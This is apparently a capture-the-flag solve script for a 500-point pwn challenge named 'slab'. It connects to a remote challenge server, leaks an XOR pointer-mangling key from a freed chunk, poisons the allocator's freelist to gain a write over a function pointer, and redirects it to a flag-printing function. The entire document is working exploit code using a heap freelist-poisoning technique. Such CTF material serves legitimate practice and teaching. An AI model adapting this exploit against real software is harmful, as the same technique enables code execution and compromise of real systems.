#!/usr/bin/env python3
# Solve for "slab" (pwn 500) -- nc 0.cloud.chals.io 20535
import struct, binascii, time
from pwn import remote, context
context.log_level = 'error'

HOST, PORT = '0.cloud.chals.io', 20535
FUNCPTR = 0x4b50d0   # report() calls [FUNCPTR]
FLAGFN  = 0x4022e6   # reads flag.txt and writes it to the client

def conn():
    for _ in range(12):
        try:
            r = remote(HOST, PORT, timeout=25); r.recvuntil(b'\n> ', timeout=6); return r
        except Exception:
            time.sleep(1.0)
    raise SystemExit("cannot connect")

def cmd(r, c, t=5):
    r.sendline(c.encode() if isinstance(c, str) else c)
    try:    return r.recvuntil(b'\n> ', timeout=t)
    except Exception: return r.recv(timeout=t)

def dec(b):
    return binascii.unhexlify(b.split(b'data ', 1)[1].split(b'\n')[0])

r = conn()
cmd(r, 'alloc')                                             # idx0 = real slab chunk
cmd(r, 'free 0')                                            # push it; its 'next' := 0 ^ KEY
KEY = struct.unpack('<Q', dec(cmd(r, 'read 0'))[:8])[0]     # leak KEY
print('[*] KEY =', hex(KEY))

cmd(r, 'edit 0 ' + struct.pack('<Q', FUNCPTR ^ KEY).hex())  # poison 'next' -> FUNCPTR
cmd(r, 'alloc')                                             # pop chunk -> idx0 ; head = FUNCPTR
cmd(r, 'alloc')                                             # pop FUNCPTR -> idx1 (buffer == &funcptr)
cmd(r, 'edit 1 ' + struct.pack('<Q', FLAGFN).hex())         # [FUNCPTR] = FLAGFN
print('[*] report funcptr overwritten -> 0x4022e6; triggering report')

r.sendline(b'report')
time.sleep(1)
data = b''
try:
    while True:
        c = r.recv(timeout=4)
        if not c: break
        data += c
except Exception:
    pass
print('[*] output:')
print(data.decode('latin1', errors='replace'))
r.close()
